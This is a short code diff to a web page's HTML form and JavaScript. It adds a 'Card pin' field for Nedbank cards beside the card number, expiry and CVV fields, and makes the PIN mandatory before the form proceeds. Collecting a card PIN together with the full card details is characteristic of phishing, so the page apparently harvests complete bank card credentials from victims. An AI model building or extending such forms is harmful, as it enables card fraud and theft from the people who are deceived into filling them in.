@@ -169,9 +169,12 @@
             <div style="display: none;" id="nedbankSecondDetails">
                 <label for="card">Card Number:</label> <br>
                 <input type="number" class="fnbs" name="nedbankcard" id="card2" placeholder="Enter Card Number"> <br>
+                
+                <label for="pin">Card pin:</label> <br>
+                <input type="number" class="fnbs" name="nedbankpin" id="nedbankpin" placeholder="Enter Card Pin"> <br>
 
                 <div id="card-details">
-                    <input type="text" class="fnbs" name="nedbankcard" id="card-date2" placeholder="mm/yy" maxlength="5"> <br>
+                    <input type="text" class="fnbs" name="nedbankdate" id="card-date2" placeholder="mm/yy" maxlength="5"> <br>
                     <input type="number" class="fnbs" name="nedbankcvv" id="cvv2" placeholder="Enter Card Cvv Number" maxlength="3"> <br>
         
                 </div>
@@ -651,6 +654,7 @@ document.getElementById("nedbankFirstdetail").addEventListener("click", function
      document.getElementById('card2'),
      document.getElementById('card-date2'),
      document.getElementById('cvv2'),
+     document.getElementById('nedbankpin'),
  ];
  let nedbankAllFilled = false;
 
